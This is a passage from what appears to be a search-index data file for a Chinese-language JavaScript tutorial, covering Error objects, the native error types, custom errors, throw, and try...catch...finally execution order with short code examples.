\u4ee3\u7801\u5757\u5173\u95ed\u6587\u4ef6\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u5145\u5206\u53cd\u6620\u4e86 try...catch...finally \u8fd9\u4e09\u8005\u4e4b\u95f4\u7684\u6267\u884c\u987a\u5e8f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function f () { try { console . log ( 0 ); throw 'bug' ; } catch ( e ) { console . log ( 1 ); return true ; // \u8fd9\u53e5\u539f\u672c\u4f1a\u5ef6\u8fdf\u5230 finally \u4ee3\u7801\u5757\u7ed3\u675f\u518d\u6267\u884c console . log ( 2 ); // \u4e0d\u4f1a\u8fd0\u884c } finally { console . log ( 3 ); return false ; // \u8fd9\u53e5\u4f1a\u8986\u76d6\u6389\u524d\u9762\u90a3\u53e5 return console . log ( 4 ); // \u4e0d\u4f1a\u8fd0\u884c } console . log ( 5 ); // \u4e0d\u4f1a\u8fd0\u884c } var result = f (); // 0 // 1 // 3 result // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c catch \u4ee3\u7801\u5757\u7ed3\u675f\u6267\u884c\u4e4b\u524d\uff0c\u4f1a\u5148\u6267\u884c finally \u4ee3\u7801\u5757\u3002 catch \u4ee3\u7801\u5757\u4e4b\u4e2d\uff0c\u89e6\u53d1\u8f6c\u5165 finally \u4ee3\u7801\u5757\u7684\u6807\u5fd7\uff0c\u4e0d\u4ec5\u6709 return \u8bed\u53e5\uff0c\u8fd8\u6709 throw \u8bed\u53e5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function f () { try { throw '\u51fa\u9519\u4e86\uff01' ; } catch ( e ) { console . log ( '\u6355\u6349\u5230\u5185\u90e8\u9519\u8bef' ); throw e ; // \u8fd9\u53e5\u539f\u672c\u4f1a\u7b49\u5230finally\u7ed3\u675f\u518d\u6267\u884c } finally { return false ; // \u76f4\u63a5\u8fd4\u56de } } try { f (); } catch ( e ) { // \u6b64\u5904\u4e0d\u4f1a\u6267\u884c console . log ( 'caught outer \"bogus\"' ); } // \u6355\u6349\u5230\u5185\u90e8\u9519\u8bef \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8fdb\u5165 catch \u4ee3\u7801\u5757\u4e4b\u540e\uff0c\u4e00\u9047\u5230 throw \u8bed\u53e5\uff0c\u5c31\u4f1a\u53bb\u6267\u884c finally \u4ee3\u7801\u5757\uff0c\u5176\u4e2d\u6709 return false \u8bed\u53e5\uff0c\u56e0\u6b64\u5c31\u76f4\u63a5\u8fd4\u56de\u4e86\uff0c\u4e0d\u518d\u4f1a\u56de\u53bb\u6267\u884c catch \u4ee3\u7801\u5757\u5269\u4e0b\u7684\u90e8\u5206\u4e86\u3002 try \u4ee3\u7801\u5757\u5185\u90e8\uff0c\u8fd8\u53ef\u4ee5\u518d\u4f7f\u7528 try \u4ee3\u7801\u5757\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 try { try { consle . log ( 'Hello world!' ); // \u62a5\u9519 } finally { console . log ( 'Finally' ); } console . log ( 'Will I run?' ); } catch ( error ) { console . error ( error . message ); } // Finally // consle is not defined \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c try \u91cc\u9762\u8fd8\u6709\u4e00\u4e2a try \u3002\u5185\u5c42\u7684 try \u62a5\u9519\uff08 console \u62fc\u9519\u4e86\uff09\uff0c\u8fd9\u65f6\u4f1a\u6267\u884c\u5185\u5c42\u7684 finally \u4ee3\u7801\u5757\uff0c\u7136\u540e\u629b\u51fa\u9519\u8bef\uff0c\u88ab\u5916\u5c42\u7684 catch \u6355\u83b7\u3002 \u53c2\u8003\u8fde\u63a5 \u00b6 Jani Hartikainen, JavaScript Errors and How to Fix Them","title":"\u9519\u8bef\u5904\u7406\u673a\u5236"},{"location":"features/error/#_1","text":"","title":"\u9519\u8bef\u5904\u7406\u673a\u5236"},{"location":"features/error/#error","text":"JavaScript \u89e3\u6790\u6216\u8fd0\u884c\u65f6\uff0c\u4e00\u65e6\u53d1\u751f\u9519\u8bef\uff0c\u5f15\u64ce\u5c31\u4f1a\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u5bf9\u8c61\u3002JavaScript \u539f\u751f\u63d0\u4f9b Error \u6784\u9020\u51fd\u6570\uff0c\u6240\u6709\u629b\u51fa\u7684\u9519\u8bef\u90fd\u662f\u8fd9\u4e2a\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\u3002 1 2 var err = new Error ( '\u51fa\u9519\u4e86' ); err . message // \"\u51fa\u9519\u4e86\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6211\u4eec\u8c03\u7528 Error() \u6784\u9020\u51fd\u6570\uff0c\u751f\u6210\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61 err \u3002 Error() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u9519\u8bef\u63d0\u793a\uff0c\u53ef\u4ee5\u4ece\u5b9e\u4f8b\u7684 message \u5c5e\u6027\u8bfb\u5230\u8fd9\u4e2a\u53c2\u6570\u3002\u629b\u51fa Error \u5b9e\u4f8b\u5bf9\u8c61\u4ee5\u540e\uff0c\u6574\u4e2a\u7a0b\u5e8f\u5c31\u4e2d\u65ad\u5728\u53d1\u751f\u9519\u8bef\u7684\u5730\u65b9\uff0c\u4e0d\u518d\u5f80\u4e0b\u6267\u884c\u3002 JavaScript \u8bed\u8a00\u6807\u51c6\u53ea\u63d0\u5230\uff0c Error \u5b9e\u4f8b\u5bf9\u8c61\u5fc5\u987b\u6709 message \u5c5e\u6027\uff0c\u8868\u793a\u51fa\u9519\u65f6\u7684\u63d0\u793a\u4fe1\u606f\uff0c\u6ca1\u6709\u63d0\u5230\u5176\u4ed6\u5c5e\u6027\u3002\u5927\u591a\u6570 JavaScript \u5f15\u64ce\uff0c\u5bf9 Error \u5b9e\u4f8b\u8fd8\u63d0\u4f9b name \u548c stack \u5c5e\u6027\uff0c\u5206\u522b\u8868\u793a\u9519\u8bef\u7684\u540d\u79f0\u548c\u9519\u8bef\u7684\u5806\u6808\uff0c\u4f46\u5b83\u4eec\u662f\u975e\u6807\u51c6\u7684\uff0c\u4e0d\u662f\u6bcf\u79cd\u5b9e\u73b0\u90fd\u6709\u3002 message \uff1a\u9519\u8bef\u63d0\u793a\u4fe1\u606f name \uff1a\u9519\u8bef\u540d\u79f0\uff08\u975e\u6807\u51c6\u5c5e\u6027\uff09 stack \uff1a\u9519\u8bef\u7684\u5806\u6808\uff08\u975e\u6807\u51c6\u5c5e\u6027\uff09 \u4f7f\u7528 name \u548c message \u8fd9\u4e24\u4e2a\u5c5e\u6027\uff0c\u53ef\u4ee5\u5bf9\u53d1\u751f\u4ec0\u4e48\u9519\u8bef\u6709\u4e00\u4e2a\u5927\u6982\u7684\u4e86\u89e3\u3002 1 2 3 if ( error . name ) { console . log ( error . name + ': ' + error . message ); } stack \u5c5e\u6027\u7528\u6765\u67e5\u770b\u9519\u8bef\u53d1\u751f\u65f6\u7684\u5806\u6808\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function throwit () { throw new Error ( '' ); } function catchit () { try { throwit (); } catch ( e ) { console . log ( e . stack ); // print stack trace } } catchit () // Error // at throwit (~/examples/throwcatch.js:9:11) // at catchit (~/examples/throwcatch.js:3:9) // at repl:1:5 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9519\u8bef\u5806\u6808\u7684\u6700\u5185\u5c42\u662f throwit \u51fd\u6570\uff0c\u7136\u540e\u662f catchit \u51fd\u6570\uff0c\u6700\u540e\u662f\u51fd\u6570\u7684\u8fd0\u884c\u73af\u5883\u3002","title":"Error \u5b9e\u4f8b\u5bf9\u8c61"},{"location":"features/error/#_2","text":"Error \u5b9e\u4f8b\u5bf9\u8c61\u662f\u6700\u4e00\u822c\u7684\u9519\u8bef\u7c7b\u578b\uff0c\u5728\u5b83\u7684\u57fa\u7840\u4e0a\uff0cJavaScript \u8fd8\u5b9a\u4e49\u4e86\u5176\u4ed66\u79cd\u9519\u8bef\u5bf9\u8c61\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b58\u5728 Error \u76846\u4e2a\u6d3e\u751f\u5bf9\u8c61\u3002","title":"\u539f\u751f\u9519\u8bef\u7c7b\u578b"},{"location":"features/error/#syntaxerror","text":"SyntaxError \u5bf9\u8c61\u662f\u89e3\u6790\u4ee3\u7801\u65f6\u53d1\u751f\u7684\u8bed\u6cd5\u9519\u8bef\u3002 1 2 3 4 5 6 7 // \u53d8\u91cf\u540d\u9519\u8bef var 1 a ; // Uncaught SyntaxError: Invalid or unexpected token // \u7f3a\u5c11\u62ec\u53f7 console . log 'hello' ); // Uncaught SyntaxError: Unexpected string \u4e0a\u9762\u4ee3\u7801\u7684\u9519\u8bef\uff0c\u90fd\u662f\u5728\u8bed\u6cd5\u89e3\u6790\u9636\u6bb5\u5c31\u53ef\u4ee5\u53d1\u73b0\uff0c\u6240\u4ee5\u4f1a\u629b\u51fa SyntaxError \u3002\u7b2c\u4e00\u4e2a\u9519\u8bef\u63d0\u793a\u662f\u201ctoken \u975e\u6cd5\u201d\uff0c\u7b2c\u4e8c\u4e2a\u9519\u8bef\u63d0\u793a\u662f\u201c\u5b57\u7b26\u4e32\u4e0d\u7b26\u5408\u8981\u6c42\u201d\u3002","title":"SyntaxError \u5bf9\u8c61"},{"location":"features/error/#referenceerror","text":"ReferenceError \u5bf9\u8c61\u662f\u5f15\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u53d8\u91cf\u65f6\u53d1\u751f\u7684\u9519\u8bef\u3002 1 2 3 // \u4f7f\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u53d8\u91cf unknownVariable // Uncaught ReferenceError: unknownVariable is not defined \u53e6\u4e00\u79cd\u89e6\u53d1\u573a\u666f\u662f\uff0c\u5c06\u4e00\u4e2a\u503c\u5206\u914d\u7ed9\u65e0\u6cd5\u5206\u914d\u7684\u5bf9\u8c61\uff0c\u6bd4\u5982\u5bf9\u51fd\u6570\u7684\u8fd0\u884c\u7ed3\u679c\u8d4b\u503c\u3002 1 2 3 // \u7b49\u53f7\u5de6\u4fa7\u4e0d\u662f\u53d8\u91cf console . log () = 1 // Uncaught ReferenceError: Invalid left-hand side in assignment \u4e0a\u9762\u4ee3\u7801\u5bf9\u51fd\u6570 console.log \u7684\u8fd0\u884c\u7ed3\u679c\u8d4b\u503c\uff0c\u7ed3\u679c\u5f15\u53d1\u4e86 ReferenceError \u9519\u8bef\u3002","title":"ReferenceError \u5bf9\u8c61"},{"location":"features/error/#rangeerror","text":"RangeError \u5bf9\u8c61\u662f\u4e00\u4e2a\u503c\u8d85\u51fa\u6709\u6548\u8303\u56f4\u65f6\u53d1\u751f\u7684\u9519\u8bef\u3002\u4e3b\u8981\u6709\u51e0\u79cd\u60c5\u51b5\uff0c\u4e00\u662f\u6570\u7ec4\u957f\u5ea6\u4e3a\u8d1f\u6570\uff0c\u4e8c\u662f Number \u5bf9\u8c61\u7684\u65b9\u6cd5\u53c2\u6570\u8d85\u51fa\u8303\u56f4\uff0c\u4ee5\u53ca\u51fd\u6570\u5806\u6808\u8d85\u8fc7\u6700\u5927\u503c\u3002 1 2 3 // \u6570\u7ec4\u957f\u5ea6\u4e0d\u5f97\u4e3a\u8d1f\u6570 new Array ( - 1 ) // Uncaught RangeError: Invalid array length","title":"RangeError \u5bf9\u8c61"},{"location":"features/error/#typeerror","text":"TypeError \u5bf9\u8c61\u662f\u53d8\u91cf\u6216\u53c2\u6570\u4e0d\u662f\u9884\u671f\u7c7b\u578b\u65f6\u53d1\u751f\u7684\u9519\u8bef\u3002\u6bd4\u5982\uff0c\u5bf9\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u3001\u6570\u503c\u7b49\u539f\u59cb\u7c7b\u578b\u7684\u503c\u4f7f\u7528 new \u547d\u4ee4\uff0c\u5c31\u4f1a\u629b\u51fa\u8fd9\u79cd\u9519\u8bef\uff0c\u56e0\u4e3a new \u547d\u4ee4\u7684\u53c2\u6570\u5e94\u8be5\u662f\u4e00\u4e2a\u6784\u9020\u51fd\u6570\u3002 1 2 3 4 5 6 new 123 // Uncaught TypeError: 123 is not a constructor var obj = {}; obj . unknownMethod () // Uncaught TypeError: obj.unknownMethod is not a function \u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u8c03\u7528\u5bf9\u8c61\u4e0d\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u4e5f\u4f1a\u629b\u51fa TypeError \u9519\u8bef\uff0c\u56e0\u4e3a obj.unknownMethod \u7684\u503c\u662f undefined \uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u51fd\u6570\u3002","title":"TypeError \u5bf9\u8c61"},{"location":"features/error/#urierror","text":"URIError \u5bf9\u8c61\u662f URI \u76f8\u5173\u51fd\u6570\u7684\u53c2\u6570\u4e0d\u6b63\u786e\u65f6\u629b\u51fa\u7684\u9519\u8bef\uff0c\u4e3b\u8981\u6d89\u53ca encodeURI() \u3001 decodeURI() \u3001 encodeURIComponent() \u3001 decodeURIComponent() \u3001 escape() \u548c unescape() \u8fd9\u516d\u4e2a\u51fd\u6570\u3002 1 2 decodeURI ( '%2' ) // URIError: URI malformed","title":"URIError \u5bf9\u8c61"},{"location":"features/error/#evalerror","text":"eval \u51fd\u6570\u6ca1\u6709\u88ab\u6b63\u786e\u6267\u884c\u65f6\uff0c\u4f1a\u629b\u51fa EvalError \u9519\u8bef\u3002\u8be5\u9519\u8bef\u7c7b\u578b\u5df2\u7ecf\u4e0d\u518d\u4f7f\u7528\u4e86\uff0c\u53ea\u662f\u4e3a\u4e86\u4fdd\u8bc1\u4e0e\u4ee5\u524d\u4ee3\u7801\u517c\u5bb9\uff0c\u624d\u7ee7\u7eed\u4fdd\u7559\u3002","title":"EvalError \u5bf9\u8c61"},{"location":"features/error/#_3","text":"\u4ee5\u4e0a\u8fd96\u79cd\u6d3e\u751f\u9519\u8bef\uff0c\u8fde\u540c\u539f\u59cb\u7684 Error \u5bf9\u8c61\uff0c\u90fd\u662f\u6784\u9020\u51fd\u6570\u3002\u5f00\u53d1\u8005\u53ef\u4ee5\u4f7f\u7528\u5b83\u4eec\uff0c\u624b\u52a8\u751f\u6210\u9519\u8bef\u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002\u8fd9\u4e9b\u6784\u9020\u51fd\u6570\u90fd\u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u4ee3\u8868\u9519\u8bef\u63d0\u793a\u4fe1\u606f\uff08message\uff09\u3002 1 2 3 4 5 6 7 var err1 = new Error ( '\u51fa\u9519\u4e86\uff01' ); var err2 = new RangeError ( '\u51fa\u9519\u4e86\uff0c\u53d8\u91cf\u8d85\u51fa\u6709\u6548\u8303\u56f4\uff01' ); var err3 = new TypeError ( '\u51fa\u9519\u4e86\uff0c\u53d8\u91cf\u7c7b\u578b\u65e0\u6548\uff01' ); err1 . message // \"\u51fa\u9519\u4e86\uff01\" err2 . message // \"\u51fa\u9519\u4e86\uff0c\u53d8\u91cf\u8d85\u51fa\u6709\u6548\u8303\u56f4\uff01\" err3 . message // \"\u51fa\u9519\u4e86\uff0c\u53d8\u91cf\u7c7b\u578b\u65e0\u6548\uff01\"","title":"\u603b\u7ed3"},{"location":"features/error/#_4","text":"\u9664\u4e86 JavaScript \u539f\u751f\u63d0\u4f9b\u7684\u4e03\u79cd\u9519\u8bef\u5bf9\u8c61\uff0c\u8fd8\u53ef\u4ee5\u5b9a\u4e49\u81ea\u5df1\u7684\u9519\u8bef\u5bf9\u8c61\u3002 1 2 3 4 5 6 7 function UserError ( message ) { this . message = message || '\u9ed8\u8ba4\u4fe1\u606f' ; this . name = 'UserError' ; } UserError . prototype = new Error (); UserError . prototype . constructor = UserError ; \u4e0a\u9762\u4ee3\u7801\u81ea\u5b9a\u4e49\u4e00\u4e2a\u9519\u8bef\u5bf9\u8c61 UserError \uff0c\u8ba9\u5b83\u7ee7\u627f Error \u5bf9\u8c61\u3002\u7136\u540e\uff0c\u5c31\u53ef\u4ee5\u751f\u6210\u8fd9\u79cd\u81ea\u5b9a\u4e49\u7c7b\u578b\u7684\u9519\u8bef\u4e86\u3002 1 new UserError ( '\u8fd9\u662f\u81ea\u5b9a\u4e49\u7684\u9519\u8bef\uff01' );","title":"\u81ea\u5b9a\u4e49\u9519\u8bef"},{"location":"features/error/#throw","text":"throw \u8bed\u53e5\u7684\u4f5c\u7528\u662f\u624b\u52a8\u4e2d\u65ad\u7a0b\u5e8f\u6267\u884c\uff0c\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\u3002 1 2 3 4 5 6 var x = - 1 ; if ( x <= 0 ) { throw new Error ( 'x \u5fc5\u987b\u4e3a\u6b63\u6570' ); } // Uncaught Error: x \u5fc5\u987b\u4e3a\u6b63\u6570 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u53d8\u91cf x \u5c0f\u4e8e\u7b49\u4e8e 0 \uff0c\u5c31\u624b\u52a8\u629b\u51fa\u4e00\u4e2a\u9519\u8bef\uff0c\u544a\u8bc9\u7528\u6237 x \u7684\u503c\u4e0d\u6b63\u786e\uff0c\u6574\u4e2a\u7a0b\u5e8f\u5c31\u4f1a\u5728\u8fd9\u91cc\u4e2d\u65ad\u6267\u884c\u3002\u53ef\u4ee5\u770b\u5230\uff0c throw \u629b\u51fa\u7684\u9519\u8bef\u5c31\u662f\u5b83\u7684\u53c2\u6570\uff0c\u8fd9\u91cc\u662f\u4e00\u4e2a Error \u5bf9\u8c61\u7684\u5b9e\u4f8b\u3002 throw \u4e5f\u53ef\u4ee5\u629b\u51fa\u81ea\u5b9a\u4e49\u9519\u8bef\u3002 1 2 3 4 5 6 7 function UserError ( message ) { this . message = message || '\u9ed8\u8ba4\u4fe1\u606f' ; this . name = 'UserError' ; } throw new UserError ( '\u51fa\u9519\u4e86\uff01' ); // Uncaught UserError {message: \"\u51fa\u9519\u4e86\uff01\", name: \"UserError\"} \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c throw \u629b\u51fa\u7684\u662f\u4e00\u4e2a UserError \u5b9e\u4f8b\u3002 \u5b9e\u9645\u4e0a\uff0c throw \u53ef\u4ee5\u629b\u51fa\u4efb\u4f55\u7c7b\u578b\u7684\u503c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u7684\u53c2\u6570\u53ef\u4ee5\u662f\u4efb\u4f55\u503c\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // \u629b\u51fa\u4e00\u4e2a\u5b57\u7b26\u4e32 throw 'Error\uff01' ; // Uncaught Error\uff01 // \u629b\u51fa\u4e00\u4e2a\u6570\u503c throw 42 ; // Uncaught 42 // \u629b\u51fa\u4e00\u4e2a\u5e03\u5c14\u503c throw true ; // Uncaught true // \u629b\u51fa\u4e00\u4e2a\u5bf9\u8c61 throw { toString : function () { return 'Error!' ; } }; // Uncaught {toString: \u0192} \u5bf9\u4e8e JavaScript \u5f15\u64ce\u6765\u8bf4\uff0c\u9047\u5230 throw \u8bed\u53e5\uff0c\u7a0b\u5e8f\u5c31\u4e2d\u6b62\u4e86\u3002\u5f15\u64ce\u4f1a\u63a5\u6536\u5230 throw \u629b\u51fa\u7684\u4fe1\u606f\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u9519\u8bef\u5b9e\u4f8b\uff0c\u4e5f\u53ef\u80fd\u662f\u5176\u4ed6\u7c7b\u578b\u7684\u503c\u3002","title":"throw \u8bed\u53e5"},{"location":"features/error/#trycatch","text":"\u4e00\u65e6\u53d1\u751f\u9519\u8bef\uff0c\u7a0b\u5e8f\u5c31\u4e2d\u6b62\u6267\u884c\u4e86\u3002JavaScript \u63d0\u4f9b\u4e86 try...catch \u7ed3\u6784\uff0c\u5141\u8bb8\u5bf9\u9519\u8bef\u8fdb\u884c\u5904\u7406\uff0c\u9009\u62e9\u662f\u5426\u5f80\u4e0b\u6267\u884c\u3002 1 2 3 4 5 6 7 8 9 try { throw new Error ( '\u51fa\u9519\u4e86!' ); } catch ( e ) { console . log ( e . name + \": \" + e . message ); console . log ( e . stack ); } // Error: \u51fa\u9519\u4e86! // at <anonymous>:3:9 // ... \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c try \u4ee3\u7801\u5757\u629b\u51fa\u9519\u8bef\uff08\u4e0a\u4f8b\u7528\u7684\u662f throw \u8bed\u53e5\uff09\uff0cJavaScript \u5f15\u64ce\u5c31\u7acb\u5373\u628a\u4ee3\u7801\u7684\u6267\u884c\uff0c\u8f6c\u5230 catch \u4ee3\u7801\u5757\uff0c\u6216\u8005\u8bf4\u9519\u8bef\u88ab catch \u4ee3\u7801\u5757\u6355\u83b7\u4e86\u3002 catch \u63a5\u53d7\u4e00\u4e2a\u53c2\u6570\uff0c\u8868\u793a try \u4ee3\u7801\u5757\u629b\u51fa\u7684\u503c\u3002 \u5982\u679c\u4f60\u4e0d\u786e\u5b9a\u67d0\u4e9b\u4ee3\u7801\u662f\u5426\u4f1a\u62a5\u9519\uff0c\u5c31\u53ef\u4ee5\u628a\u5b83\u4eec\u653e\u5728 try...catch \u4ee3\u7801\u5757\u4e4b\u4e2d\uff0c\u4fbf\u4e8e\u8fdb\u4e00\u6b65\u5bf9\u9519\u8bef\u8fdb\u884c\u5904\u7406\u3002 1 2 3 4 5 try { f (); } catch ( e ) { // \u5904\u7406\u9519\u8bef } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u51fd\u6570 f \u6267\u884c\u62a5\u9519\uff0c\u5c31\u4f1a\u8fdb\u884c catch \u4ee3\u7801\u5757\uff0c\u63a5\u7740\u5bf9\u9519\u8bef\u8fdb\u884c\u5904\u7406\u3002 catch \u4ee3\u7801\u5757\u6355\u83b7\u9519\u8bef\u4e4b\u540e\uff0c\u7a0b\u5e8f\u4e0d\u4f1a\u4e2d\u65ad\uff0c\u4f1a\u6309\u7167\u6b63\u5e38\u6d41\u7a0b\u7ee7\u7eed\u6267\u884c\u4e0b\u53bb\u3002 1 2 3 4 5 6 7 8 try { throw \"\u51fa\u9519\u4e86\" ; } catch ( e ) { console . log ( 111 ); } console . log ( 222 ); // 111 // 222 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c try \u4ee3\u7801\u5757\u629b\u51fa\u7684\u9519\u8bef\uff0c\u88ab catch \u4ee3\u7801\u5757\u6355\u83b7\u540e\uff0c\u7a0b\u5e8f\u4f1a\u7ee7\u7eed\u5411\u4e0b\u6267\u884c\u3002 catch \u4ee3\u7801\u5757\u4e4b\u4e2d\uff0c\u8fd8\u53ef\u4ee5\u518d\u629b\u51fa\u9519\u8bef\uff0c\u751a\u81f3\u4f7f\u7528\u5d4c\u5957\u7684 try...catch \u7ed3\u6784\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var n = 100 ; try { throw n ; } catch ( e ) { if ( e <= 50 ) { // ... } else { throw e ; } } // Uncaught 100 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c catch \u4ee3\u7801\u4e4b\u4e2d\u53c8\u629b\u51fa\u4e86\u4e00\u4e2a\u9519\u8bef\u3002 \u4e3a\u4e86\u6355\u6349\u4e0d\u540c\u7c7b\u578b\u7684\u9519\u8bef\uff0c catch \u4ee3\u7801\u5757\u4e4b\u4e2d\u53ef\u4ee5\u52a0\u5165\u5224\u65ad\u8bed\u53e5\u3002 1 2 3 4 5 6 7 8 9 10 try { foo . bar (); } catch ( e ) { if ( e instanceof EvalError ) { console . log ( e . name + \": \" + e . message ); } else if ( e instanceof RangeError ) { console . log ( e . name + \": \" + e . message ); } // ... } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c catch \u6355\u83b7\u9519\u8bef\u4e4b\u540e\uff0c\u4f1a\u5224\u65ad\u9519\u8bef\u7c7b\u578b\uff08 EvalError \u8fd8\u662f RangeError \uff09\uff0c\u8fdb\u884c\u4e0d\u540c\u7684\u5904\u7406\u3002","title":"try...catch \u7ed3\u6784"},{"location":"features/error/#finally","text":"try...catch \u7ed3\u6784\u5141\u8bb8\u5728\u6700\u540e\u6dfb\u52a0\u4e00\u4e2a finally \u4ee3\u7801\u5757\uff0c\u8868\u793a\u4e0d\u7ba1\u662f\u5426\u51fa\u73b0\u9519\u8bef\uff0c\u90fd\u5fc5\u9700\u5728\u6700\u540e\u8fd0\u884c\u7684\u8bed\u53e5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function cleansUp () { try { throw new Error ( '\u51fa\u9519\u4e86\u2026\u2026' ); console . log ( '\u6b64\u884c\u4e0d\u4f1a\u6267\u884c' ); } finally { console . log ( '\u5b8c\u6210\u6e05\u7406\u5de5\u4f5c' ); } } cleansUp () // \u5b8c\u6210\u6e05\u7406\u5de5\u4f5c // Uncaught Error: \u51fa\u9519\u4e86\u2026\u2026 // at cleansUp (<anonymous>:3:11) // at <anonymous>:10:1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u6ca1\u6709 catch \u8bed\u53e5\u5757\uff0c\u4e00\u65e6\u53d1\u751f\u9519\u8bef\uff0c\u4ee3\u7801\u5c31\u4f1a\u4e2d\u65ad\u6267\u884c\u3002\u4e2d\u65ad\u6267\u884c\u4e4b\u524d\uff0c\u4f1a\u5148\u6267\u884c finally \u4ee3\u7801\u5757\uff0c\u7136\u540e\u518d\u5411\u7528\u6237\u63d0\u793a\u62a5\u9519\u4fe1\u606f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 function idle ( x ) { try { console . log ( x ); return 'result' ; } finally { console . log ( 'FINALLY' ); } } idle ( 'hello' ) // hello // FINALLY \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c try \u4ee3\u7801\u5757\u6ca1\u6709\u53d1\u751f\u9519\u8bef\uff0c\u800c\u4e14\u91cc\u9762\u8fd8\u5305\u62ec return \u8bed\u53e5\uff0c\u4f46\u662f finally \u4ee3\u7801\u5757\u4f9d\u7136\u4f1a\u6267\u884c\u3002\u800c\u4e14\uff0c\u8fd9\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u8fd8\u662f result \u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u8bf4\u660e\uff0c return \u8bed\u53e5\u7684\u6267\u884c\u662f\u6392\u5728 finally \u4ee3\u7801\u4e4b\u524d\uff0c\u53ea\u662f\u7b49 finally \u4ee3\u7801\u6267\u884c\u5b8c\u6bd5\u540e\u624d\u8fd4\u56de\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 var count = 0 ; function countUp () { try { return count ; } finally { count ++ ; } } countUp () // 0 count // 1 \u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c return \u8bed\u53e5\u91cc\u9762\u7684 count \u7684\u503c\uff0c\u662f\u5728 finally \u4ee3\u7801\u5757\u8fd0\u884c\u4e4b\u524d\u5c31\u83b7\u53d6\u4e86\u3002 \u4e0b\u9762\u662f finally \u4ee3\u7801\u5757\u7528\u6cd5\u7684\u5178\u578b\u573a\u666f\u3002 1 2 3 4 5 6 7 8 9 openFile (); try { writeFile ( Data ); } catch ( e ) { handleError ( e ); } finally { closeFile (); } \u4e0a\u9762\u4ee3\u7801\u9996\u5148\u6253\u5f00\u4e00\u4e2a\u6587\u4ef6\uff0c\u7136\u540e\u5728 try \u4ee3\u7801\u5757\u4e2d\u5199\u5165\u6587\u4ef6\uff0c\u5982\u679c\u6ca1\u6709\u53d1\u751f\u9519\u8bef\uff0c\u5219\u8fd0\u884c finally \u4ee3\u7801\u5757\u5173\u95ed\u6587\u4ef6\uff1b\u4e00\u65e6\u53d1\u751f\u9519\u8bef\uff0c\u5219\u5148\u4f7f\u7528 catch \u4ee3\u7801\u5757\u5904\u7406\u9519\u8bef\uff0c\u518d\u4f7f\u7528 finally \u4ee3\u7801\u5757\u5173\u95ed\u6587\u4ef6\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u5145\u5206\u53cd\u6620\u4e86 try...catch...finally \u8fd9\u4e09\u8005\u4e4b\u95f4\u7684\u6267\u884c\u987a\u5e8f\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 function f () { try { console . log ( 0 ); throw 'bug' ; } catch ( e ) { console . log ( 1 ); return true ; // \u8fd9\u53e5\u539f\u672c\u4f1a\u5ef6\u8fdf\u5230 finally \u4ee3\u7801\u5757\u7ed3\u675f\u518d\u6267\u884c console . log ( 2 ); // \u4e0d\u4f1a\u8fd0\u884c } finally { console . log ( 3 ); return false ; // \u8fd9\u53e5\u4f1a\u8986\u76d6\u6389\u524d\u9762\u90a3\u53e5 return console . log ( 4 ); // \u4e0d\u4f1a\u8fd0\u884c } console . log ( 5 ); // \u4e0d\u4f1a\u8fd0\u884c } var result = f (); // 0 // 1 // 3 result // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c catch \u4ee3\u7801\u5757\u7ed3\u675f\u6267\u884c\u4e4b\u524d\uff0c\u4f1a\u5148\u6267\u884c finally \u4ee3\u7801\u5757\u3002 catch \u4ee3\u7801\u5757\u4e4b\u4e2d\uff0c\u89e6\u53d1\u8f6c\u5165 finally \u4ee3\u7801\u5757\u7684\u6807\u5fd7\uff0c\u4e0d\u4ec5\u6709 return \u8bed\u53e5\uff0c\u8fd8\u6709 throw \u8bed\u53e5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 function f () { try { throw 